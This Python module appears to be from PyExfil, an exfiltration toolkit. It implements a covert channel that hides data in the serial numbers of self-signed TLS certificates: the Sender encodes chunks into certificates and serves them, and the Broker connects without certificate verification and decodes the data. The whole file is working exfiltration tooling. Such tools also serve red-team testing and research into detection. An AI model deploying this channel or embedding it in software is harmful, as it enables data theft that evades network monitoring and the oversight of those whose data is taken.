import ssl
import sys
import random
import socket

from OpenSSL import SSL
import OpenSSL.crypto as crypto

from pyexfil.includes.general import _split_every_n


CHUNK_SIZE = 256


def _bytes_to_int(bytes):
    result = 0
    for b in bytes:
        result = result * 256 + int(b)
    return result


def _int_to_bytes(value, length):
    result = []
    for i in range(0, length):
        result.append(value >> (i * 8) & 0xFF)
    result.reverse()
    return result


class Broker:
    def __init__(self, key, server, port=443):
        self.key = key
        self.server = server
        self.port = port

    def GetData(self):
        sock = socket.socket()
        sock.connect((self.server, self.port))

        ctx = SSL.Context(SSL.SSLv23_METHOD)  # most compatible
        ctx.check_hostname = False
        ctx.verify_mode = SSL.VERIFY_NONE

        sock_ssl = SSL.Connection(ctx, sock)
        sock_ssl.set_connect_state()
        sock_ssl.do_handshake()
        cert = sock_ssl.get_peer_certificate()
        crypto_cert = cert.to_cryptography()
        sock_ssl.close()
        sock.close()

        decoded = _int_to_bytes(crypto_cert.serial_number, 256)
        end_index = 0
        counter = 0
        data = False
        for ind, b in enumerate(decoded):
            if b == 153 and counter != 0:
                counter += 1
            elif b == 153:
                end_index = ind
                counter += 1
            else:
                end_index = 0
                counter = 0
            if counter > 5:
                data = decoded[:end_index]
                break
        if not data:
            sys.stderr.write("Could not find data in certificate.\n")
            output = False
        else:
            output = ""
            for i in data:
                output += chr(i)

        return output, crypto_cert


class Sender:
    def __init__(self, key, server, port=443):
        self.key = key
        self.server = server
        self.port = port

    def _create_cert(self, serial, cn):
        if len(serial) != CHUNK_SIZE:
            raise ("Too Much Data")

        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, 1024)
        cert = crypto.X509()
        cert.get_subject().C = "XX"
        cert.get_subject().ST = "GitHub"
        cert.get_subject().L = "ytisf"
        cert.get_subject().O = "PyExfil"
        cert.get_subject().OU = "CertExchange"
        cert.get_subject().CN = cn
        cert.set_serial_number(_bytes_to_int(serial))
        cert.gmtime_adj_notBefore(random.randint(-123423, 0))
        cert.gmtime_adj_notAfter(315360000)
        cert.set_issuer(cert.get_subject())
        cert.set_pubkey(k)
        cert.sign(k, random.choice(["md5", "sha1", "sha256"]))
        return k, cert

    def _parse_input(self, input_data):
        if len(input_data) % CHUNK_SIZE != 0:
            self.input_chunks = _split_every_n(input_data, CHUNK_SIZE)
            last_diff = CHUNK_SIZE - len(self.input_chunks[-1])
            self.input_chunks[-1] = self.input_chunks[-1] + b"\x99" * last_diff

        else:
            return True

    def Send(self, data_to_send):
        certs = []

        data_to_send = bytes(data_to_send, "ascii")

        self._parse_input(input_data=data_to_send)

        for data_packet in self.input_chunks:
            k, c = self._create_cert(serial=data_packet, cn=self.server)
            certs.append([k, c])

        i = 0

        for k, cert in certs:
            i += 1
            open("/tmp/now.pem", "wb").write(
                crypto.dump_certificate(crypto.FILETYPE_PEM, cert)
            )  # .decode("utf-8") )
            open("/tmp/now.pem", "ab").write(
                crypto.dump_privatekey(crypto.FILETYPE_PEM, k)
            )  # .decode("utf-8") )

            sock = socket.socket()
            sock.bind((self.server, self.port))
            sock.listen(1)

            context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            context.load_cert_chain(certfile="/tmp/now.pem")
            context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1  # optional
            context.set_ciphers("EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH")

            sys.stdout.write("Serving cert %s.\n" % i)
            ssock, addr = sock.accept()
            try:
                conn = context.wrap_socket(ssock, server_side=True)
                conn.write(b"HTTP/1.1 200 OK\n\n%s" % conn.getpeername()[0].encode())
            except ssl.SSLError as e:
                print(e)
            finally:
                # conn.close()
                sock.close()
                sys.stdout.write("Cert %i out of %i received.\n" % (i, len(certs)))
